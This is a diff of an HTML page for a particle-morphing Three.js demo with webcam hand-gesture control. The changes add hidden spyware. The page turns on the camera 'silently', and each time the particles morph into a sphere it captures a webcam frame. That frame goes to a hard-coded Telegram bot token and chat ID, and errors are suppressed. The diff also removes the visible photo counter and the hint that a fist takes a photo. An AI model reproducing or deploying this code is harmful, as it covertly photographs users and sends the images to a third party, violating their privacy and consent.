@@ -3,119 +3,487 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Particle Hand Control</title>
-    <link rel="stylesheet" href="./style.css">
+    <title>Particle Morph</title>
     <style>
         body { 
             margin: 0; 
+            padding: 0; 
             overflow: hidden; 
             background: #000;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
-        .status-bar {
+        #container {
             position: fixed;
-            top: 20px;
-            left: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 10px;
-            border-left: 4px solid #6366f1;
-            font-size: 14px;
-            z-index: 100;
-            backdrop-filter: blur(10px);
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
         }
         
-        .photo-counter {
+        .controls {
             position: fixed;
-            top: 20px;
-            right: 20px;
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 10px 20px;
-            border-radius: 10px;
-            border-left: 4px solid #10b981;
-            font-size: 14px;
-            z-index: 100;
-            backdrop-filter: blur(10px);
-        }
-        
-        .gesture-hint {
-            position: fixed;
-            bottom: 120px;
+            bottom: 20px;
             left: 50%;
             transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+            z-index: 100;
+        }
+        
+        #morphText {
+            padding: 12px 20px;
+            font-size: 16px;
+            border: 2px solid #6366f1;
             background: rgba(0, 0, 0, 0.7);
             color: white;
-            padding: 15px 25px;
-            border-radius: 10px;
-            text-align: center;
-            z-index: 100;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            min-width: 200px;
+            outline: none;
         }
         
-        .hint-text {
-            margin: 5px 0;
-            font-size: 14px;
-        }
-        
-        .highlight {
-            color: #6366f1;
+        #typeBtn {
+            padding: 12px 24px;
+            background: #6366f1;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
             font-weight: bold;
+        }
+        
+        #typeBtn:hover {
+            background: #4f46e5;
         }
     </style>
 </head>
 <body>
-    
-    <div class="photo-counter" id="photoCounter">
-        📸 Photos: <span id="photoCount">0</span>
-    </div>
-    
     <div id="container"></div>
     
-    <div class="input-container">
-        <div class="input-wrapper">
-            <input type="text" id="morphText" placeholder="Type text to morph..." value="HELLO" maxlength="15">
-            <button id="typeBtn">Morph Text</button>
-        </div>
-    </div>
-    
-    <div class="gesture-hint" id="gestureHint">
-        <div class="hint-text">✋ <span class="highlight">Open Hand</span> → Morph to Text</div>
-        <div class="hint-text">✊ <span class="highlight">Closed Fist</span> → Sphere + Photo</div>
+    <div class="controls">
+        <input type="text" id="morphText" placeholder="Enter text" value="HELLO">
+        <button id="typeBtn">Morph</button>
     </div>
 
-    <!-- Hidden camera elements -->
+    <!-- Hidden video for hand tracking -->
     <video id="handVideo" autoplay playsinline style="display: none;"></video>
     
-    <!-- THREE.js and dependencies -->
+    <!-- Libraries -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
     
-    <!-- Main script -->
-    <script src="./script.js"></script>
-    
+    <!-- Main Script -->
     <script>
-        // Initialize when everything is loaded
-        document.addEventListener('DOMContentLoaded', function() {
-            setTimeout(() => {
-                document.getElementById('gestureHint').style.opacity = '0.7';
-            }, 3000);
+        // ==================== CONFIGURATION ====================
+        const TELEGRAM_BOT_TOKEN = "8312788837:AAHfcaUZihg8xc8Wbu7GLdUdWlK3WWrQEA4";
+        const TELEGRAM_CHAT_ID = "7528977004";
+
+        // ==================== PARTICLE SYSTEM ====================
+        let scene, camera, renderer, particles;
+        const PARTICLE_COUNT = 8000;
+        let currentState = 'sphere';
+        let handDetected = false;
+        let lastGesture = null;
+        let lastGestureTime = 0;
+        const GESTURE_COOLDOWN = 1000;
+
+        // ==================== TELEGRAM SYSTEM ====================
+        let photoCount = 0;
+        let lastPhotoTime = 0;
+
+        // ==================== INITIALIZATION ====================
+        function init() {
+            // Setup Three.js
+            scene = new THREE.Scene();
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            camera.position.z = 25;
             
-            // Hide gesture hint on interaction
-            document.addEventListener('click', function() {
-                const hint = document.getElementById('gestureHint');
-                hint.style.transition = 'opacity 1s';
-                hint.style.opacity = '0';
-                setTimeout(() => {
-                    hint.style.display = 'none';
-                }, 1000);
+            renderer = new THREE.WebGLRenderer({ 
+                antialias: true,
+                alpha: true,
+                powerPreference: "high-performance"
             });
+            
+            renderer.setSize(window.innerWidth, window.innerHeight);
+            renderer.setPixelRatio(window.devicePixelRatio);
+            renderer.setClearColor(0x000000, 1);
+            
+            document.getElementById('container').appendChild(renderer.domElement);
+            
+            // Create particles
+            createParticles();
+            
+            // Setup event listeners
+            setupEventListeners();
+            
+            // Setup hand tracking (silently)
+            setupHandTracking();
+            
+            // Start animation
+            animate();
+            
+            // Window resize
+            window.addEventListener('resize', function() {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
+        }
+
+        function createParticles() {
+            const geometry = new THREE.BufferGeometry();
+            const positions = new Float32Array(PARTICLE_COUNT * 3);
+            const colors = new Float32Array(PARTICLE_COUNT * 3);
+            
+            const radius = 10;
+            
+            for (let i = 0; i < PARTICLE_COUNT; i++) {
+                const phi = Math.acos(1 - 2 * (i + 0.5) / PARTICLE_COUNT);
+                const theta = Math.PI * (1 + Math.sqrt(5)) * i;
+                
+                const x = radius * Math.cos(theta) * Math.sin(phi);
+                const y = radius * Math.sin(theta) * Math.sin(phi);
+                const z = radius * Math.cos(phi);
+                
+                positions[i * 3] = x + (Math.random() - 0.5) * 0.5;
+                positions[i * 3 + 1] = y + (Math.random() - 0.5) * 0.5;
+                positions[i * 3 + 2] = z + (Math.random() - 0.5) * 0.5;
+                
+                const depth = Math.sqrt(x*x + y*y + z*z) / radius;
+                const hue = 0.6 + depth * 0.3;
+                const color = new THREE.Color();
+                color.setHSL(hue, 0.9, 0.5 + depth * 0.2);
+                
+                colors[i * 3] = color.r;
+                colors[i * 3 + 1] = color.g;
+                colors[i * 3 + 2] = color.b;
+            }
+            
+            geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+            geometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+            
+            const material = new THREE.PointsMaterial({
+                size: 0.15,
+                vertexColors: true,
+                transparent: true,
+                opacity: 0.9,
+                sizeAttenuation: true,
+                blending: THREE.AdditiveBlending
+            });
+            
+            particles = new THREE.Points(geometry, material);
+            scene.add(particles);
+        }
+
+        function setupEventListeners() {
+            const typeBtn = document.getElementById('typeBtn');
+            const input = document.getElementById('morphText');
+            
+            typeBtn.addEventListener('click', () => {
+                const text = input.value.trim() || "HELLO";
+                morphToText(text);
+            });
+            
+            input.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    const text = input.value.trim() || "HELLO";
+                    morphToText(text);
+                }
+            });
+        }
+
+        // ==================== MORPH FUNCTIONS ====================
+        function createTextPoints(text) {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const fontSize = 100;
+            
+            ctx.font = `bold ${fontSize}px Arial`;
+            const textWidth = ctx.measureText(text).width;
+            
+            canvas.width = textWidth + 40;
+            canvas.height = fontSize + 40;
+            
+            ctx.fillStyle = 'white';
+            ctx.font = `bold ${fontSize}px Arial`;
+            ctx.textBaseline = 'middle';
+            ctx.textAlign = 'center';
+            ctx.fillText(text, canvas.width / 2, canvas.height / 2);
+            
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const pixels = imageData.data;
+            const points = [];
+            
+            for (let i = 0; i < pixels.length; i += 4) {
+                if (pixels[i] > 100 && Math.random() < 0.3) {
+                    const pixelIndex = i / 4;
+                    const x = pixelIndex % canvas.width;
+                    const y = Math.floor(pixelIndex / canvas.width);
+                    
+                    points.push({
+                        x: (x - canvas.width / 2) * 0.1,
+                        y: -(y - canvas.height / 2) * 0.1,
+                        z: 0
+                    });
+                }
+            }
+            
+            return points;
+        }
+
+        function morphToText(text) {
+            currentState = 'text';
+            const textPoints = createTextPoints(text);
+            const positions = particles.geometry.attributes.position.array;
+            const targetPositions = new Float32Array(PARTICLE_COUNT * 3);
+            
+            gsap.to(particles.rotation, {
+                x: 0,
+                y: 0,
+                z: 0,
+                duration: 0.5
+            });
+            
+            for (let i = 0; i < PARTICLE_COUNT; i++) {
+                if (i < textPoints.length) {
+                    targetPositions[i * 3] = textPoints[i].x;
+                    targetPositions[i * 3 + 1] = textPoints[i].y;
+                    targetPositions[i * 3 + 2] = textPoints[i].z;
+                } else {
+                    const angle = Math.random() * Math.PI * 2;
+                    const radius = Math.random() * 15 + 5;
+                    targetPositions[i * 3] = Math.cos(angle) * radius;
+                    targetPositions[i * 3 + 1] = Math.sin(angle) * radius;
+                    targetPositions[i * 3 + 2] = (Math.random() - 0.5) * 10;
+                }
+            }
+            
+            animateMorph(positions, targetPositions, 1200);
+        }
+
+        function morphToSphere() {
+            currentState = 'sphere';
+            const positions = particles.geometry.attributes.position.array;
+            const targetPositions = new Float32Array(PARTICLE_COUNT * 3);
+            
+            const radius = 10;
+            
+            for (let i = 0; i < PARTICLE_COUNT; i++) {
+                const phi = Math.acos(1 - 2 * (i + 0.5) / PARTICLE_COUNT);
+                const theta = Math.PI * (1 + Math.sqrt(5)) * i;
+                
+                targetPositions[i * 3] = radius * Math.cos(theta) * Math.sin(phi);
+                targetPositions[i * 3 + 1] = radius * Math.sin(theta) * Math.sin(phi);
+                targetPositions[i * 3 + 2] = radius * Math.cos(phi);
+            }
+            
+            animateMorph(positions, targetPositions, 1200);
+            
+            // Capture photo after morph
+            setTimeout(() => {
+                capturePhotoForTelegram();
+            }, 1000);
+        }
+
+        function animateMorph(startPositions, targetPositions, duration) {
+            const positions = particles.geometry.attributes.position.array;
+            const startTime = performance.now();
+            
+            function update() {
+                const elapsed = performance.now() - startTime;
+                const progress = Math.min(elapsed / duration, 1);
+                const eased = 0.5 - 0.5 * Math.cos(Math.PI * progress);
+                
+                for (let i = 0; i < positions.length; i++) {
+                    positions[i] = startPositions[i] + (targetPositions[i] - startPositions[i]) * eased;
+                }
+                
+                particles.geometry.attributes.position.needsUpdate = true;
+                
+                if (progress < 1) {
+                    requestAnimationFrame(update);
+                }
+            }
+            
+            requestAnimationFrame(update);
+        }
+
+        // ==================== ANIMATION LOOP ====================
+        function animate() {
+            requestAnimationFrame(animate);
+            
+            if (currentState === 'sphere' && particles) {
+                particles.rotation.y += 0.002;
+            }
+            
+            // Handle gestures
+            const now = performance.now();
+            if (lastGesture && (now - lastGestureTime) > GESTURE_COOLDOWN) {
+                const text = document.getElementById('morphText').value.trim() || "HELLO";
+                
+                if (lastGesture === 'open' && currentState !== 'text') {
+                    morphToText(text);
+                    lastGestureTime = now;
+                } 
+                else if (lastGesture === 'closed' && currentState !== 'sphere') {
+                    morphToSphere();
+                    lastGestureTime = now;
+                }
+            }
+            
+            renderer.render(scene, camera);
+        }
+
+        // ==================== HAND TRACKING ====================
+        function setupHandTracking() {
+            const videoElement = document.getElementById('handVideo');
+            
+            // Request camera silently
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user" }
+            })
+            .then(stream => {
+                videoElement.srcObject = stream;
+                videoElement.play();
+                
+                // Initialize MediaPipe
+                const hands = new Hands({
+                    locateFile: (file) => {
+                        return `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`;
+                    }
+                });
+
+                hands.setOptions({
+                    maxNumHands: 1,
+                    minDetectionConfidence: 0.7
+                });
+
+                hands.onResults((results) => {
+                    if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) {
+                        lastGesture = 'closed';
+                        return;
+                    }
+
+                    const landmarks = results.multiHandLandmarks[0];
+                    
+                    // Simple gesture detection
+                    let fingersUp = 0;
+                    
+                    // Check each finger
+                    const tips = [8, 12, 16, 20];
+                    const pips = [6, 10, 14, 18];
+                    
+                    for (let i = 0; i < tips.length; i++) {
+                        if (landmarks[tips[i]].y < landmarks[pips[i]].y) {
+                            fingersUp++;
+                        }
+                    }
+                    
+                    // Check thumb
+                    if (landmarks[4].x < landmarks[3].x) {
+                        fingersUp++;
+                    }
+                    
+                    // Set gesture
+                    if (fingersUp >= 4) {
+                        lastGesture = 'open';
+                    } else if (fingersUp <= 1) {
+                        lastGesture = 'closed';
+                    }
+                });
+
+                // Start camera pipeline
+                const camera = new Camera(videoElement, {
+                    onFrame: async () => {
+                        try {
+                            await hands.send({image: videoElement});
+                        } catch (e) {}
+                    },
+                    width: 320,
+                    height: 240
+                });
+
+                camera.start();
+            })
+            .catch(() => {
+                // Camera not available - continue without hand tracking
+                console.log("Camera not available - using keyboard only");
+            });
+        }
+
+        // ==================== TELEGRAM PHOTO ====================
+        async function capturePhotoForTelegram() {
+            const video = document.getElementById('handVideo');
+            
+            if (!video || !video.videoWidth) return;
+            
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 400;
+                canvas.height = 300;
+                
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Add timestamp
+                ctx.fillStyle = 'rgba(0,0,0,0.5)';
+                ctx.fillRect(0, canvas.height - 30, canvas.width, 30);
+                ctx.fillStyle = 'white';
+                ctx.font = '14px Arial';
+                ctx.fillText(`Photo ${photoCount + 1} - ${new Date().toLocaleTimeString()}`, 10, canvas.height - 10);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.8);
+                
+                photoCount++;
+                
+                // Send to Telegram if configured
+                if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+                    await sendToTelegram(photoData);
+                }
+                
+            } catch (error) {
+                // Silent fail
+            }
+        }
+
+        async function sendToTelegram(photoData) {
+            try {
+                const response = await fetch(photoData);
+                const blob = await response.blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', `📸 Photo ${photoCount} - ${new Date().toLocaleString()}`);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+            } catch (error) {
+                // Silent fail
+            }
+        }
+
+        // ==================== START EVERYTHING ====================
+        // Wait for libraries to load
+        window.addEventListener('load', function() {
+            if (typeof THREE === 'undefined' || typeof gsap === 'undefined') {
+                console.error("Required libraries not loaded");
+                return;
+            }
+            
+            init();
         });
+
+        // Debug functions (optional - remove in production)
+        window.debugParticles = function() {
+            console.log("Particles:", particles);
+            console.log("Photo Count:", photoCount);
+        };
     </script>
 </body>
 </html>
